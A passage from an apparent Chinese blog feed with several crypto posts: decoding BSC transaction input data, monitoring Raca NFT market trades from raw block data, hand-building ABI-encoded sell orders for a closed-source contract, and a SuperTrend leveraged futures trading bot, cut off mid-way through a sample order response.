<p><code>0x5c11d79500000000000000000000000000000000000000000000065a4da25d3016c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000c6ce2918d13b7983fa6c305e726c3dc4c805b42100000000000000000000000000000000000000000000000000000000615fe5380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000acb8f52dc63bb752a51186d1c55868adbffee9c1000000000000000000000000197ea04912dc81fcd19992e6210168109aa9c3fe</code></p>
<p>最后一段数据是 回购宝石代币的代币地址</p>
<p>暂且判断最后一段数据，是哪个代币地址，则是回购了哪个代币</p>
<hr />
<h2 id="效果">效果:</h2>
<p>定时任务+tg提醒</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/03DD10DA-7E3B-46BD-9ECA-A0B600AA74AC.png" alt="03DD10DA-7E3B-46BD-9ECA-A0B600AA74AC" /></p>
<hr />
<h1>Bug:</h1>
<p>刚开始跑的时候，发现有延迟</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211008153914.png" alt="20211008153914" /></p>
<p><code>https://api.bscscan.com/api?module=account&amp;action=txlist&amp;address=0xF426a8d0A94bf039A35CEE66dBf0227A7a12D11e&amp;startblock=0&amp;endblock=99999999&amp;page=1&amp;offset=10&amp;sort=asc&amp;apikey=YourApiKeyToken</code></p>
<p>猜测是<code>startblock</code>参数造成的，不要从0区块开始查，后续每次跑的时候都更新一下这个参数即可。</p>
<hr />
<h1>decode input data试验:</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line">infuraurl = <span class="string">&#x27;https://rpcapi.fantom.network&#x27;</span></span><br><span class="line">web3_ins = Web3(Web3.HTTPProvider(infuraurl))</span><br><span class="line">connection_status = (web3_ins.isConnected())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] fantom network connect status : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(connection_status))</span><br><span class="line">contract = web3_ins.eth.contract(address=Contract_Addr, abi=json.loads(Contract_Abi))</span><br><span class="line"></span><br><span class="line">input_data= <span class="string">&quot;0x9024944800000000000000000000000000000000000000000000000000000000001215e0&quot;</span></span><br><span class="line"></span><br><span class="line">result  = contract.decode_function_input(input_data)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>在有abi的情况下，确实是可以解出input data的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&lt;Function level_up(uint256)&gt;, &#123;&#x27;_summoner&#x27;: 1185248&#125;)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/3C8C2ECB-DEF5-45CC-BFA8-088E83552776.png" alt="3C8C2ECB-DEF5-45CC-BFA8-088E83552776" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/556A7322-7E85-4AD0-B6CB-CCAA10C09D20.png" alt="556A7322-7E85-4AD0-B6CB-CCAA10C09D20" /></p>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://docs.bscscan.com/api-endpoints/accounts">bscscan api</a></p>
</li>
<li class="lvl-2">
<p><a href="https://ethereum.stackexchange.com/questions/11144/how-to-decode-input-data-from-a-transaction">How to decode input data from a transaction?</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-Raca Nft市场实时交易记录</title>
    <url>/2021/43268.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220512174618.png" alt="20220512174618" /></p>
<p>朋友有需求，想要监控<code>Raca NFT</code>市场在BSC链上的实时交易记录特别是某几类物品挂的卖单，比如药水等，方便他可以买到较便宜的物品。</p>
<p>要获取Raca NFT市场的实时交易记录，有两个数据来源：</p>
<ol>
<li class="lvl-3">
<p>官方网站爬虫、API</p>
</li>
<li class="lvl-3">
<p>读取bsc每个块的数据</p>
</li>
</ol>
<p>第一种延时严重，存在几分钟的延时，所以采取第二种</p>
<h1>读取Bsc Block Data</h1>
<h2 id="快速读取block数据">快速读取block数据</h2>
<p>bsc链上约3s左右出一个块,出块的频率很高。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220512174907.png" alt="20220512174907" /></p>
<p>一开始是简单使用<code>time.sleep()</code>去停顿几秒，避免对节点发起过多的请求，但是这样会出现漏块的问题。</p>
<p>后来想到是，配置多个节点地址，每次查询前随机选用一个节点，这样既可以减少漏块的几率，也不会因为查询频率过高被节点ban.</p>
<p>经过多次测试，此类大量查询的情况下，官方给的节点相比商用的有限制次数的节点会更好用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 官方给的节点列表</span></span><br><span class="line">RPC_List = [<span class="string">&#x27;https://bsc-dataseed.binance.org/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed1.defibit.io/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed1.ninicoin.io/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed2.defibit.io/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed3.defibit.io/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed4.defibit.io/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed2.ninicoin.io/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed3.ninicoin.io/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed4.ninicoin.io/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed1.binance.org/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed2.binance.org/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed3.binance.org/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed4.binance.org/&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>能稳定、快速的获取到block的数据后，接下来就要过滤出跟Raca NFT市场相关的交易记录</p>
<h2 id="过滤相关记录：">过滤相关记录：</h2>
<p>相关的交易记录：tx的to地址指向raca市场合约</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list_of_block_transactions = block.transactions</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> transaction <span class="keyword">in</span> list_of_block_transactions:</span><br><span class="line">    to_account = transaction[<span class="string">&#x27;to&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> to_account == self.contract_addr: <span class="comment"># 与raca市场合约交互的记录</span></span><br><span class="line">        self.parse_transaction(transaction, block_timestamp)</span><br></pre></td></tr></table></figure>
<p>过滤出相关记录后，就要进行对记录进行解析了。</p>
<h2 id="解析：">解析：</h2>
<p><code>input data</code>的前八位为方法名，找出买卖两类函数的hash，就可以再次过滤出raca市场有关的买卖交易记录了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_transaction</span>(<span class="params">self, transaction, block_timestamp</span>):</span><br><span class="line">    <span class="comment"># logger.debug(&quot;parse transaction. hash:&#123;&#125;&quot;.format(hash_info[&quot;hash&quot;]))</span></span><br><span class="line">    transaction_info = &#123;&#125;</span><br><span class="line">    transaction_info[<span class="string">&quot;tx&quot;</span>] = transaction[<span class="string">&quot;hash&quot;</span>].<span class="built_in">hex</span>()</span><br><span class="line">    transaction_info[<span class="string">&quot;from&quot;</span>] = transaction[<span class="string">&quot;from&quot;</span>]</span><br><span class="line">    transaction_info[<span class="string">&quot;time&quot;</span>] = timestamp2date(<span class="built_in">int</span>(block_timestamp))</span><br><span class="line"></span><br><span class="line">    input_data = transaction[<span class="string">&quot;input&quot;</span>]</span><br><span class="line">    four_byte = input_data[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> four_byte == <span class="string">&quot;0x467f963d&quot;</span>:  <span class="comment"># sell的函数选择器</span></span><br><span class="line">        transaction_info[<span class="string">&quot;type&quot;</span>] = <span class="string">&quot;SELL&quot;</span></span><br><span class="line">        nft_token, token_id, num, per_price = self.parse_sell_input_data(input_data)</span><br><span class="line">        transaction_info[<span class="string">&quot;token&quot;</span>] = Web3.toChecksumAddress(nft_token)</span><br><span class="line">        transaction_info[<span class="string">&quot;tokenId&quot;</span>] = token_id</span><br><span class="line">        transaction_info[<span class="string">&quot;count&quot;</span>] = num</span><br><span class="line">        transaction_info[<span class="string">&quot;amount&quot;</span>] = <span class="built_in">str</span>(per_price)</span><br><span class="line">        <span class="comment"># 。。。。</span></span><br></pre></td></tr></table></figure>
<p>剩下的部分,就是对各个参数进行解析了。</p>
<blockquote>
<p>data组成规则:<br />
关于data，前八位为方法名以及参数类型的hash，只要方法名，参数个数，参数顺序以及参数类型确定，方法名hash就确定</p>
<p>hash往后64位进行分割，每一段就是方法的参数，不足64前面补零凑64位</p>
<p>参数中对于数组类型要注意，解析会有点特殊，一般会先以位数序号进行占位，然后到指定位序才是真正数组数据的起点，数组数据起点会先表明下面数据有多少位，然后才是数组数据的依次排列</p>
</blockquote>
<h1>小结:</h1>
<p>至此，通过以下几个步骤</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>读取block数据</p>
</li>
<li class="lvl-2">
<p>过滤出raca市场合约相关交易</p>
</li>
<li class="lvl-2">
<p>过滤出买卖相关的交易</p>
</li>
</ul>
<p>就基本可以完成对<code>Raca NFT</code>市场实时交易记录的监控了。</p>
<hr />
<p>在开发的过程中，也发现了一些有趣的点。</p>
<h1>有趣的点：</h1>
<h2 id="科学家抢购">科学家抢购:</h2>
<p>比如该<a href="https://bscscan.com/tx/0x80aef859189aa9508ca6760cd669057ed592bf1ac646f6c5951c8dd6e89b4927">tx</a>在<code>13151047</code>区块挂了元兽蛋的卖单，每个以<code>86.5raca</code>售出</p>
<p>在接下来的几个区块，都有人发单去抢最快是之后的第二个区块:block_num: <code>13151049</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 抢购的tx列表</span></span><br><span class="line"><span class="number">0x62ab3cb23f62459154b652dfb855d4f6f9df4b6fa27363ce69484909f695b94c</span></span><br><span class="line"><span class="number">0x6e8e06710565fd9cd5f4d8223ed172d817f2e50b5f0aa4f297bf9738bab5b541</span></span><br><span class="line"><span class="number">0xfd1bee48d470f8bf9b3f4134ea5de7fc323f20b3de2ccd6d8658f02378d97649</span></span><br><span class="line"><span class="number">0x65ec96412cd5632b8e29225cb8ce96bb76429cc4da68a28ad394643c75a2c8b7</span></span><br><span class="line"><span class="number">0x094b419c95790a8514193a79e2835db42e7ccc0313a5d6511a486853c06508d3</span></span><br></pre></td></tr></table></figure>
<p>第三个区块:block_num: <code>13151050</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 抢购的tx列表</span></span><br><span class="line"><span class="number">0x23b210a6e49dc724ad7d36ca89c57ca187d6e179d568bfe1f0acba77ab09fbc3</span>        </span><br><span class="line"><span class="number">0xfa8327cbd2e3e5d92cc6e23e1b1e0d3d1f40e17976d76047d91da6385396de3f</span></span><br><span class="line"><span class="number">0x4a93d2d696df10b78a5b69b095a134a6f12642aa76f92239cf0efcc660ab114b</span></span><br></pre></td></tr></table></figure>
<p>第六个区块:block_num: <code>13151053</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 抢购的tx列表</span></span><br><span class="line"><span class="number">0xc4373dd6aac99ecb046c581f8006c34bda520111b4e575d400241eb59d889e85</span></span><br></pre></td></tr></table></figure>
<p>奇怪的是大家都抢购失败了，<code>Fail with error 'Auction: auction not OnAuction'</code>但能在卖单的之后的第二个区块，能检测并发起买单的这些科学家的实力都是挺厉害的。</p>
<h2 id="市场活跃度-差价">市场活跃度&amp;差价</h2>
<p>在比较火的那段时间里，raca nft市场的交易量是特别大的，流动性很足，基本上很多商品只要挂最低价上去，就会被立刻买走。另外，raca nft市场可以批量10个或100个卖出，一般批量的价格会比单个的价格更低，存在一些差价，这当中有套利的机会。</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-RacaNft市场挂单script</title>
    <url>/2021/1333.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>朋友有一批raca potion的nft要出售,尝试用程序去挂单</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211119161018.png" alt="20211119161018" /></p>
<p>raca的nft market的合约没开源，自然无法用abi、合约地址去实例化合约对象，然后快速调用合约对应函数。需要自己构造data，与合约交互。</p>
<hr />
<h1>InputData例子解析:</h1>
<p>先了解一下InputData是怎么构成的。以下面最简单的合约为例，我们看看用参数 1 调用set(uint x)，这个交易附带的数据是什么。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SimpleStorage</span> &#123;</span><br><span class="line">    </span><br><span class="line">    uint storedData;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set</span>(<span class="params">uint x</span>) public &#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params"></span>) public constant returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> storedData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然第一步需要先把合约部署到以太坊网络上，然后用 “1” 作为参数调用set，如下图:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211117175500.png" alt="20211117175500" /></p>
<p>然后打开etherscan查看交易详情数据, 可以看到其附加数据如下图：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211117175532.png" alt="20211117175532" /></p>
<p>这个数据就是ABI的编码数据：<br />
<code>0x60fe47b10000000000000000000000000000000000000000000000000000000000000001</code></p>
<p>把上面交易的附加数据拷贝出来分析一下，这个数据可以分成两个子部分：</p>
<p>函数选择器(4字节)</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>0x60fe47b1</code></p>
</li>
</ul>
<p>第一个参数(32字节)</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>00000000000000000000000000000000000000000000000000000000000000001</code></p>
</li>
</ul>
<p>函数选择器值 实际是对函数签名字符串进行<code>sha3（keccak256</code>哈希运算之后，取前4个字节，用代码表示就是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes4(sha3(“set(uint256)”)) == 0x60fe47b1</span><br></pre></td></tr></table></figure>
<p>参数部分则是使用对应的16进制数。现在就好理解 附加数据怎么转化为对应的函数调用。</p>
<h1>实验:</h1>
<p>刚好自己有在练手solidity，有部署到ropsten测试网上。可以尝试能不能构造出已知交易的<code>input_data</code></p>
<p>调用的合约函数:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createZoombie</span>(<span class="params">string name</span>) public &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mint_zoombie</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># function createZoombie(string name) public&#123;&#125;</span></span><br><span class="line">    func_abi = &#123;</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: [</span><br><span class="line">            &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;abc&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>&#125;,  <span class="comment"># 参数类型</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;createZoombie&quot;</span>,  <span class="comment"># 函数名</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fn_selector = <span class="string">&#x27;0x&#x27;</span> + encode_hex(function_abi_to_4byte_selector(func_abi)) </span><br><span class="line"></span><br><span class="line">    args_data = encode_hex(encode_single(<span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;haha&#x27;</span>))  <span class="comment"># encode_abi([&#x27;string&#x27;], [&#x27;haha&#x27;])</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(fn_selector)</span><br><span class="line">    <span class="built_in">print</span>(args_data)</span><br><span class="line">    total_data = fn_selector + args_data</span><br><span class="line">    <span class="built_in">print</span>(total_data)</span><br></pre></td></tr></table></figure>
<p>实际的<code>input_data</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x3dca7430 <span class="comment"># 方法名</span></span><br><span class="line">6861686100000000000000000000000000000000000000000000000000000000 <span class="comment"># 参数:haha</span></span><br></pre></td></tr></table></figure>
<p>构造出的<code>input_data</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x3dca7430 <span class="comment"># 方法名</span></span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000020</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000004</span><br><span class="line">6861686100000000000000000000000000000000000000000000000000000000 <span class="comment"># 参数:haha</span></span><br></pre></td></tr></table></figure>
<p>没有构造成功，经过多个tx,观察发现中间多出来的数据是固定。但一时不知道是如何generate出来的，只能暂时先放弃了。</p>
<h1>data的组成规则：</h1>
<blockquote>
<p>关于data，前八位为方法名以及参数类型的hash，只要方法名，参数个数，参数顺序以及参数类型确定，方法名hash就确定</p>
<p>hash往后64位进行分割，每一段就是方法的参数，不足64前面补零凑64位</p>
<p>参数中对于数组类型要注意，解析会有点特殊，一般会先以位数序号进行占位，然后到指定位序才是真正数组数据的起点，数组数据起点会先表明下面数据有多少位，然后才是数组数据的依次排列</p>
</blockquote>
<h1>raca nft挂单卖出:</h1>
<h2 id="授权：">授权：</h2>
<p>授权这个data比较简单，找到多几个tx比较一下。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211119155832.png" alt="20211119155832" /></p>
<p>可知他的data是固定的，直接用就行了。</p>
<h2 id="挂单卖出：">挂单卖出：</h2>
<p>依然是找到多几个tx比较一下，按照data的组成规则分开观察。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x467f963d                                                         <span class="comment"># function selector</span></span><br><span class="line">00000000000000000000000051353799f8550c9010a8b0cbfe6c02ca96e026e2   <span class="comment"># usm potion药水地址</span></span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000001   <span class="comment"># 数量</span></span><br><span class="line">00000000000000000000000012bb890508c125661e03b09ec06e404bc9289040   <span class="comment"># Raca token 地址</span></span><br><span class="line">0000000000000000000000000000000000000000000002f6d546136addf80000   <span class="comment"># 价格</span></span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure>
<p>可知，主要是要修改数量和价格的数据，其他数据不变。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造卖单的data</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_potion_sell_order_input_data</span>(<span class="params">self, price</span>):</span><br><span class="line">    logger.debug(<span class="string">&quot;[*] set price: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(price))</span><br><span class="line">    price = self.bsc_ins.w3.toWei(price, <span class="string">&#x27;ether&#x27;</span>) <span class="comment"># 转换成Wei</span></span><br><span class="line"></span><br><span class="line">    price_hex_str = self.bsc_ins.w3.toHex(price) <span class="comment"># 转换成16进制</span></span><br><span class="line">    price_hex_str = price_hex_str.replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="comment"># 去掉开头的0x字符串</span></span><br><span class="line">    full_price_hex_str = add_pre_zero(price_hex_str) <span class="comment"># 不足64位，前面补0</span></span><br><span class="line">    <span class="comment"># print(full_price_hex_str)</span></span><br><span class="line">    last_input_data = <span class="string">&quot;0x467f963d00000000000000000000000051353799f8550c9010a8b0cbfe6c02ca96e026e20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000012bb890508c125661e03b09ec06e404bc9289040&#123;&#125;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            full_price_hex_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> last_input_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造tx的参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tx_params</span>(<span class="params">self, to_address, input_data, gas</span>):</span><br><span class="line">    now_nonce = self.bsc_ins.w3.eth.get_transaction_count(self.wallet_addr)</span><br><span class="line">    to_address = Web3.toChecksumAddress(to_address)</span><br><span class="line">    tx_params = &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: now_nonce,</span><br><span class="line">        <span class="string">&#x27;to&#x27;</span>: to_address,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: self.bsc_ins.w3.toWei(<span class="number">0</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span>: gas,</span><br><span class="line">        <span class="string">&#x27;gasPrice&#x27;</span>: self.bsc_ins.w3.toWei(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: input_data, <span class="comment"># here</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tx_params</span><br></pre></td></tr></table></figure>
<p>将tx用私钥签名，广播交易就可以了。然后检测对应账户里的raca数量就可以知道有没卖出成功。</p>
<h1>Summary:</h1>
<ol>
<li class="lvl-3">
<p>data的组成规则：前八位为方法名以及参数类型的hash，hash往后64位进行分割，每一段就是方法的参数，不足64前面补零凑64位</p>
</li>
<li class="lvl-3">
<p>多找相关的tx比较，找规律</p>
</li>
</ol>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://xz.aliyun.com/t/6900">如何与无源码的智能合约交互</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/2018/08/09/understand-abi">如何理解以太坊ABI - 应用程序二进制接口</a></p>
</li>
<li class="lvl-2">
<p><a href="https://cloud.tencent.com/developer/article/1328286">深入以太坊智能合约 ABI</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-SuperTrend指标_合约交易脚本</title>
    <url>/2021/14610.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>上一篇是去购买现货,回测几次后，发现效果还不错，由于定量设置了止盈率，挂好了<code>limit sell order</code>后,在短期拉盘的时候，能卖得出去。</p>
<p>想起之前看的<a href="https://tokentax.co/blog/best-crypto-trading-bot/">The Best Crypto Trading Bots On the Market | TokenTax</a></p>
<blockquote>
<p>crypto trading bots enable trading based on data and trends—not on emotional impulse</p>
<p>Ultimately, this usually grows their profits, minimizes their risks, and limits their losses across exchanges.</p>
<p>Furthermore, bots can produce passive income 24 hours a day. Whether you’re sleeping, biking, giving a presentation, whatever: you could also be earning from automated trades.</p>
</blockquote>
<p>通过策略写机器人来做交易,算是有严格的纪律性了，由数据驱动，不受情绪的影响。另外一个好处就是，不用去盯盘。</p>
<p>这次拿来做合约交易</p>
<hr />
<h1>策略:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>选择一个我认为比较好的投资标的(币):<code>BNB</code></p>
</li>
<li class="lvl-2">
<p>选择一个交易周期:45mins</p>
</li>
<li class="lvl-2">
<p>Buy信号发出,很可能处于上涨行情,执行市价买入,5倍杠杠</p>
</li>
<li class="lvl-2">
<p>设置收益率5%,执行限价卖出</p>
</li>
<li class="lvl-2">
<p>以上每一步都设置tg提醒，入库记录</p>
</li>
<li class="lvl-2">
<p>暂不设置止损，5倍杠杠，币种暴跌20%可能会爆仓</p>
</li>
</ul>
<h1>效果:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/C83CAF70-1EA0-4882-AF5E-2697664AB1B7.png" alt="C83CAF70-1EA0-4882-AF5E-2697664AB1B7" /></p>
<hr />
<h1>遇到的问题:</h1>
<h2 id="创建订单">创建订单:</h2>
<p>之前用的交易所是<code>binance</code>,这次用的是<code>ftx</code>通过ccxt在创建ftx limit sell order的时候花费比较多时间,参考<a href="https://github.com/ccxt/ccxt/issues/6740">Unable To create Limit orders on FTX</a>,才知道需要哪些参数.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cex_api.create_future_order(token_pair=<span class="string">&#x27;CAKE-PERP&#x27;</span>, <span class="built_in">type</span>=<span class="string">&quot;takeProfit&quot;</span>, side=<span class="string">&quot;sell&quot;</span>, amount=<span class="number">1</span>, price=<span class="number">20.32</span>, params=&#123;<span class="string">&#x27;triggerPrice&#x27;</span>: <span class="number">20.32</span>,<span class="string">&#x27;reduceOnly&#x27;</span>: <span class="literal">True</span>&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="返回的订单内容">返回的订单内容:</h2>
<p>同样是执行<code>market buy order</code>，<code>binance</code>和<code>ftx</code>返回的内容不一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># binance</span><br><span class="line">order = &#123;</span><br><span class="line">	&#x27;info&#x27;: &#123;</span><br><span class="line">		&#x27;symbol&#x27;: &#x27;CAKEUSDT&#x27;,</span><br><span class="line">		&#x27;orderId&#x27;: &#x27;253501445&#x27;,</span><br><span class="line">		&#x27;orderListId&#x27;: &#x27;-1&#x27;,</span><br><span class="line">		&#x27;clientOrderId&#x27;: &#x27;x-R4BD3S8213738c964e85cb662119c9&#x27;,</span><br><span class="line">		&#x27;transactTime&#x27;: &#x27;1630229168854&#x27;,</span><br><span class="line">		&#x27;price&#x27;: &#x27;0.00000000&#x27;,</span><br><span class="line">		&#x27;origQty&#x27;: &#x27;0.50000000&#x27;,</span><br><span class="line">		&#x27;executedQty&#x27;: &#x27;0.50000000&#x27;,</span><br><span class="line">		&#x27;cummulativeQuoteQty&#x27;: &#x27;12.77000000&#x27;,</span><br><span class="line">		&#x27;status&#x27;: &#x27;FILLED&#x27;,</span><br><span class="line">		&#x27;timeInForce&#x27;: &#x27;GTC&#x27;,</span><br><span class="line">		&#x27;type&#x27;: &#x27;MARKET&#x27;,</span><br><span class="line">		&#x27;side&#x27;: &#x27;BUY&#x27;,</span><br><span class="line">		&#x27;fills&#x27;: [&#123;</span><br><span class="line">			&#x27;price&#x27;: &#x27;25.54000000&#x27;,</span><br><span class="line">			&#x27;qty&#x27;: &#x27;0.50000000&#x27;,</span><br><span class="line">			&#x27;commission&#x27;: &#x27;0.00050000&#x27;,</span><br><span class="line">			&#x27;commissionAsset&#x27;: &#x27;CAKE&#x27;,</span><br><span class="line">			&#x27;tradeId&#x27;: &#x27;37608361&#x27;</span><br><span class="line">		&#125;]</span><br><span class="line">	&#125;,</span><br><span class="line">	&#x27;id&#x27;: &#x27;253501445&#x27;,</span><br><span class="line">	&#x27;clientOrderId&#x27;: &#x27;x-R4BD3S8213738c964e85cb662119c9&#x27;,</span><br><span class="line">	&#x27;timestamp&#x27;: 1630229168854,</span><br><span class="line">	&#x27;datetime&#x27;: &#x27;2021-08-29T09:26:08.854Z&#x27;,</span><br><span class="line">	&#x27;lastTradeTimestamp&#x27;: None,</span><br><span class="line">	&#x27;symbol&#x27;: &#x27;CAKE/USDT&#x27;,</span><br><span class="line">	&#x27;type&#x27;: &#x27;market&#x27;,</span><br><span class="line">	&#x27;timeInForce&#x27;: &#x27;GTC&#x27;,</span><br><span class="line">	&#x27;postOnly&#x27;: False,</span><br><span class="line">	&#x27;side&#x27;: &#x27;buy&#x27;,</span><br><span class="line">	&#x27;price&#x27;: 25.54,</span><br><span class="line">	&#x27;stopPrice&#x27;: None,</span><br><span class="line">	&#x27;amount&#x27;: 0.5,</span><br><span class="line">	&#x27;cost&#x27;: 12.77,</span><br><span class="line">	&#x27;average&#x27;: 25.54,</span><br><span class="line">	&#x27;filled&#x27;: 0.5,</span><br><span class="line">	&#x27;remaining&#x27;: 0.0,</span><br><span class="line">	&#x27;status&#x27;: &#x27;closed&#x27;,</span><br><span class="line">	&#x27;fee&#x27;: &#123;</span><br><span class="line">		&#x27;cost&#x27;: 0.0005,</span><br><span class="line">		&#x27;currency&#x27;: &#x27;CAKE&#x27;</span><br><span class="line">	&#125;,</span><br><span class="line">	&#x27;trades&#x27;: [&#123;</span><br><span class="line">		&#x27;info&#x27;: &#123;</span><br><span class="line">			&#x27;price&#x27;: &#x27;25.54000000&#x27;,</span><br><span class="line">			&#x27;qty&#x27;: &#x27;0.50000000&#x27;,</span><br><span class="line">			&#x27;commission&#x27;: &#x27;0.00050000&#x27;,</span><br><span class="line">			&#x27;commissionAsset&#x27;: &#x27;CAKE&#x27;,</span><br><span class="line">			&#x27;tradeId&#x27;: &#x27;37608361&#x27;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#x27;timestamp&#x27;: None,</span><br><span class="line">		&#x27;datetime&#x27;: None,</span><br><span class="line">		&#x27;symbol&#x27;: &#x27;CAKE/USDT&#x27;,</span><br><span class="line">		&#x27;id&#x27;: None,</span><br><span class="line">		&#x27;order&#x27;: None,</span><br><span class="line">		